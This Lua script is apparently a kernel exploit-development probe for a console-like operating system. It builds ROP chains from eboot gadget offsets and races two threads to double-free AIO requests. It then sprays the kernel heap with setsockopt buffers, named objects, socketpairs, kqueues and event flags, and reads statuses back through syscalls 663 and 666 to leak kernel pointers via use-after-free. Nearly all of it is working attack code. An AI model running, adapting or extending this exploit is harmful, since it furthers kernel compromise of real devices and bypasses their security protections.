-- CRASH_CLASS: MODERATE
-- PROBE 68a: UAF readback via 663 after cross-type spray
--
-- 67d/67e showed AIO-on-AIO reclaim doesn't change 663 status (new AIO
-- writes same value at same offset, or UMA cache isolation prevents reclaim).
--
-- This probe tests CROSS-TYPE spray: after double-free, delete one AIO
-- partner, then spray with setsockopt/sendmsg/namedobj to place DIFFERENT
-- byte patterns at the 663-read offset. If 663 returns our pattern instead
-- of 0x10003, we've proven cross-type overlap and can leak kernel pointers
-- by placing objects with kernel pointers at that offset.
--
-- Strategy:
--   A) Double-free + AIO spray → verify overlap via poll-flag oracle
--   B) Delete ALL first-partners → frees shared structures
--   C) Heavy cross-type spray: setsockopt(TCP_CONGESTION), namedobj(557),
--      socketpair creation, kqueue EV_ADD — each allocates from different zones
--   D) Query surviving partners via 663 → detect status corruption
--   E) If any status changed → identify which spray type matched the zone

print("=== PROBE 68a: UAF READBACK via cross-type spray ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt_q(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf = memory.alloc(0x4000)
local rbuf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0
end

local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEADDEAD
end

local function query_666(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function()
        mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEADDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xCD
end

-- =========================================================
-- [A] DOUBLE-FREE RACE
-- =========================================================
print("")
print("[A] DOUBLE-FREE RACE (30 iters × 16 IDs)")

local BATCH = 16
local ITERS = 30
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

local total_doubles = 0

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < BATCH then
        if #ids == 0 then print("  iter " .. iter .. ": 0 IDs, break"); break end
    end

    local count = #ids
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Child A
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Child B
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(sb_A) end

    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles
    if doubles > 0 or iter <= 2 or iter == ITERS then
        print(string.format("  iter %d: dbl=%d", iter, doubles))
    end
end
print("  total_doubles=" .. total_doubles)

if total_doubles < 4 then
    print("  INSUFFICIENT doubles for cross-type test")
    print("alive=" .. (alive() and "YES" or "NO"))
    print("=== 68a DONE ===")
    return
end
if not alive() then print("DEAD after race"); return end

-- =========================================================
-- [B] SPRAY AIO + VERIFY OVERLAP
-- =========================================================
print("")
print("[B] AIO spray + overlap verify")

local SPRAY = 128
local spray_ids = {}
for i = 1, SPRAY do
    local id = submit_one()
    if id == 0 then break end
    spray_ids[#spray_ids + 1] = id
end
print("  spray=" .. #spray_ids)

-- Poll even-indexed (1-based), check odd-indexed for cross-contamination
for i = 1, #spray_ids, 2 do poll_one(spray_ids[i]) end

local overlap_count = 0
for i = 2, #spray_ids, 2 do
    local st = query_663(spray_ids[i])
    if st == 0x00010003 then overlap_count = overlap_count + 1 end
end
print("  overlap_pairs=" .. overlap_count .. "/" .. math.floor(#spray_ids / 2))

if overlap_count < 8 then
    print("  INSUFFICIENT overlap")
    print("=== 68a DONE ===")
    return
end

-- Record baseline status for all surviving partners (even-indexed)
local baseline_663 = {}
local baseline_666 = {}
for i = 2, #spray_ids, 2 do
    baseline_663[i] = query_663(spray_ids[i])
    baseline_666[i] = query_666(spray_ids[i])
end

-- =========================================================
-- [C] DELETE FIRST PARTNERS (frees shared structures)
-- =========================================================
print("")
print("[C] Delete first partners (odd-indexed)")

local deleted = 0
for i = 1, #spray_ids, 2 do
    poll_one(spray_ids[i])
    local ds = delete_one(spray_ids[i])
    if ds == 0 then deleted = deleted + 1 end
end
print("  deleted=" .. deleted)
if not alive() then print("DEAD after delete"); return end

-- Check surviving partners BEFORE any spray
print("")
print("[D] Query survivors BEFORE cross-type spray")
local pre_changed = 0
for i = 2, math.min(20, #spray_ids), 2 do
    local st = query_663(spray_ids[i])
    if st ~= baseline_663[i] then
        pre_changed = pre_changed + 1
        print(string.format("  *** id=%d: was=%08X now=%08X", spray_ids[i], baseline_663[i], st))
    end
end
print("  pre_changed=" .. pre_changed .. " (of " .. math.min(10, math.floor(#spray_ids/2)) .. " checked)")

-- =========================================================
-- [E] CROSS-TYPE SPRAY: setsockopt with controlled patterns
-- =========================================================
print("")
print("[E] Cross-type spray: setsockopt(TCP_CONGESTION)")

-- Create TCP sockets and set congestion control name (kernel mallocs a string copy)
local spray_fds = {}
for i = 1, 64 do
    if not alive() then break end
    local ok, ret = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(6))  -- AF_INET, SOCK_STREAM, IPPROTO_TCP
    end)
    if ok then
        local fd = sgn(ret)
        if fd >= 0 then
            spray_fds[#spray_fds + 1] = fd
            -- TCP_CONGESTION = 0x40 = 64, IPPROTO_TCP = 6
            -- Write a distinctive 16-byte string as congestion algorithm name
            local pat = memory.alloc(0x40)
            -- Write 0xDEAD at dword 0 (where 663 might read)
            wd(N(pat), 0xDEADBEEF)
            wd(N(pat) + 4, 0xCAFEBABE)
            wd(N(pat) + 8, 0x41424344)
            wd(N(pat) + 12, 0x45464748)
            pcall(function()
                mk(105)(uint64(fd), uint64(6), uint64(64), uint64(N(pat)), uint64(16))
            end)
        end
    end
end
print("  tcp_sockets=" .. #spray_fds)

-- Also spray with namedobj(557) — creates kernel objects
local nobj_handles = {}
for i = 1, 64 do
    if not alive() then break end
    local name_buf = put_str(string.format("ob%04d", i))
    local ok, ret = pcall(function()
        return mk(557)(uint64(N(name_buf)), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local h = sgn(ret)
        if h >= 0 then nobj_handles[#nobj_handles + 1] = h end
    end
end
print("  namedobj=" .. #nobj_handles)

-- Spray with socketpair(AF_UNIX) — creates kernel socket structs
local spair_fds = {}
local sp_buf = memory.alloc(8)
for i = 1, 64 do
    if not alive() then break end
    wd(N(sp_buf), 0); wd(N(sp_buf) + 4, 0)
    local ok, ret = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf)))
    end)
    if ok and sgn(ret) == 0 then
        local fd0 = rd(N(sp_buf)) or -1
        local fd1 = rd(N(sp_buf) + 4) or -1
        if fd0 >= 0 then
            spair_fds[#spair_fds + 1] = fd0
            spair_fds[#spair_fds + 1] = fd1
        end
    end
end
print("  socketpair_fds=" .. #spair_fds)

-- Spray with kqueue (362) — each creates a kernel kqueue struct
local kq_fds = {}
for i = 1, 32 do
    if not alive() then break end
    local ok, ret = pcall(function() return mk(362)() end)
    if ok then
        local fd = sgn(ret)
        if fd >= 0 then kq_fds[#kq_fds + 1] = fd end
    end
end
print("  kqueue_fds=" .. #kq_fds)

-- Spray with evf(538) objects
local evf_handles = {}
for i = 1, 64 do
    if not alive() then break end
    local name_buf = put_str(string.format("ev%04d", i))
    local ok, ret = pcall(function()
        return mk(538)(uint64(N(name_buf)), uint64(0x100), uint64(0))
    end)
    if ok then
        local h = sgn(ret)
        if h >= 0 then evf_handles[#evf_handles + 1] = h end
    end
end
print("  evf_handles=" .. #evf_handles)

if not alive() then print("DEAD during spray"); return end

-- =========================================================
-- [F] QUERY SURVIVORS AFTER CROSS-TYPE SPRAY
-- =========================================================
print("")
print("[F] Query survivors AFTER cross-type spray")

local post_changed_663 = 0
local post_changed_666 = 0
local kptrs_663 = 0
local kptrs_666 = 0
local anomalies = {}

for i = 2, #spray_ids, 2 do
    if not alive() then break end
    local st_663 = query_663(spray_ids[i])
    local st_666 = query_666(spray_ids[i])

    if st_663 ~= baseline_663[i] then
        post_changed_663 = post_changed_663 + 1
        anomalies[#anomalies + 1] = string.format(
            "id=%d 663: %08X->%08X", spray_ids[i], baseline_663[i], st_663)
    end
    if st_666 ~= baseline_666[i] then
        post_changed_666 = post_changed_666 + 1
        anomalies[#anomalies + 1] = string.format(
            "id=%d 666: %08X->%08X", spray_ids[i], baseline_666[i], st_666)
    end

    -- Check for kernel pointer pattern in status
    if st_663 >= 0xFFFF8000 and st_663 < 0xFFFFFFFF then
        kptrs_663 = kptrs_663 + 1
    end
    if st_666 >= 0xFFFF8000 and st_666 < 0xFFFFFFFF then
        kptrs_666 = kptrs_666 + 1
    end
end

print("  663_changed=" .. post_changed_663)
print("  666_changed=" .. post_changed_666)
print("  kptr_663=" .. kptrs_663)
print("  kptr_666=" .. kptrs_666)

if #anomalies > 0 then
    print("  ANOMALIES:")
    for j = 1, math.min(20, #anomalies) do
        print("    " .. anomalies[j])
    end
    if #anomalies > 20 then print("    ... (" .. #anomalies .. " total)") end
end

-- =========================================================
-- [G] WIDE READ: check if 663 output buffer has more data
-- =========================================================
print("")
print("[G] Wide 663 read on survivors")
if alive() and #spray_ids >= 4 then
    local wide_buf = memory.alloc(0x100)
    for test_idx = 2, math.min(6, #spray_ids), 2 do
        for off = 0, 0xFC, 4 do wd(N(wide_buf) + off, 0xDEADDEAD) end
        wd(N(one_id), spray_ids[test_idx])
        pcall(function()
            mk(663)(uint64(N(one_id)), uint64(1), uint64(N(wide_buf)))
        end)

        local changed = 0
        local hex = ""
        for off = 0, 0x3C, 4 do
            local v = rd(N(wide_buf) + off) or 0xDEADDEAD
            hex = hex .. string.format("%08X ", v)
            if v ~= 0xDEADDEAD then changed = changed + 1 end
        end
        print(string.format("  id=%d changed=%d: %s", spray_ids[test_idx], changed, hex))

        -- Scan for kernel pointers in wide output
        for off = 0, 0xF8, 8 do
            local q = rq(N(wide_buf) + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print(string.format("  *** KPTR at +%02X: %s ***", off, fmt_q(q)))
                end
            end
        end
    end
end

-- =========================================================
-- [H] DANGEROUS: delete surviving partner after spray
-- =========================================================
print("")
print("[H] Delete one survivor (stale pointer test)")
if alive() and #spray_ids >= 4 then
    local test_id = spray_ids[2]
    poll_one(test_id)
    local ds = delete_one(test_id)
    print(string.format("  delete id=%d status=%08X", test_id, ds))
    print("  alive=" .. (alive() and "YES" or "NO"))
    if alive() and ds == 0 then
        print("  survived: stale pointer not followed OR not reclaimed")
    end
end

-- =========================================================
-- [I] CLEANUP
-- =========================================================
if alive() then
    print("")
    print("[I] Cleanup")
    -- Close spray sockets
    for _, fd in ipairs(spray_fds) do pcall(function() mk(6)(uint64(fd)) end) end
    for _, fd in ipairs(spair_fds) do pcall(function() mk(6)(uint64(fd)) end) end
    for _, fd in ipairs(kq_fds) do pcall(function() mk(6)(uint64(fd)) end) end
    -- Delete namedobj handles
    for _, h in ipairs(nobj_handles) do
        pcall(function() mk(558)(uint64(h)) end)
    end
    -- Delete evf handles
    for _, h in ipairs(evf_handles) do
        pcall(function() mk(541)(uint64(h)) end)
    end
    -- Cleanup remaining spray AIO IDs
    for i = 2, #spray_ids, 2 do
        if i ~= 2 then
            poll_one(spray_ids[i])
            delete_one(spray_ids[i])
        end
    end
    print("  done")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 68a COMPLETE ===")
